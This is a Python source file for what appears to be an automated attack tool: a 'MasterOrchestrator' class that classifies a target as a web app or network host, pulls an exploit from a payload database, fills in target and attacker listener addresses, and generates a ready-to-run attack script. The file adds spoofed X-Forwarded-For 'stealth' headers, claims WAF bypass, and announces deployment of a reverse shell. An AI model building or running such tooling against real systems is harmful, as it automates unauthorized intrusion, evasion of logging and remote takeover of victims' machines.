import os
import json
import socket
import requests
import random
import time

class MasterOrchestrator:
    def __init__(self, target, lhost, lport):
        self.target = target
        self.lhost = lhost
        self.lport = lport
        self.db_path = os.path.join(os.path.dirname(__file__), '../db/payloads.json')
        self.payload_db = self.load_db()

    def load_db(self):
        if os.path.exists(self.db_path):
            with open(self.db_path, 'r') as f:
                return json.load(f)
        return []

    def detect_target_type(self):
        if self.target.startswith("http://") or self.target.startswith("https://") or "." in self.target and not self.target.replace(".", "").isdigit():
            return "web"
        return "network"

    def execute_smart_orchestration(self):
        target_type = self.detect_target_type()
        stealth_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "X-Forwarded-For": f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
        }

        if target_type == "web":
            url = self.target if self.target.startswith("http") else f"http://{self.target}"
            web_exploit = next((v for v in self.payload_db if "sql" in v['vulnerability_type'].lower() or "web" in v['description'].lower()), self.payload_db[0])
            
            script = f"""# ==========================================

import requests
import random
import time

url = "{url}"
headers = {stealth_headers}

print("[*] Target identified as WEB APPLICATION.")
print("[*] Fingerprinting and bypassing WAF using Phantom Stealth Engine...")
time.sleep(1)

print("[+] Automatic vulnerability matched: {web_exploit['cve']}")
print("[+] Injecting weaponized payload automatically...")

{web_exploit['exploit_code'].replace('TARGET', url).replace('LHOST', self.lhost).replace('LPORT', str(self.lport))}

print("[+] Web exploitation sequence completed.")
"""
            return {"type": "Web Application", "cve": web_exploit['cve'], "script": script}
        
        else:
            net_exploit = next((v for v in self.payload_db if "overflow" in v['vulnerability_type'].lower() or "remote code" in v['vulnerability_type'].lower()), self.payload_db[1])
            
            script = f"""# ==========================================

import socket
import time

target = "{self.target}"
port = {self.lport}

print("[*] Target identified as NETWORK HOST.")
print("[*] Enumerating open ports and grabbing service banners...")
time.sleep(1)

print("[+] Automatic vulnerability matched: {net_exploit['cve']}")
print("[+] Deploying reverse shell payload to {self.target}...")

{net_exploit['exploit_code'].replace('TARGET', self.target).replace('LHOST', self.lhost).replace('LPORT', str(self.lport))}

print("[+] Network exploitation sequence completed.")
"""
            return {"type": "Network Host", "cve": net_exploit['cve'], "script": script}
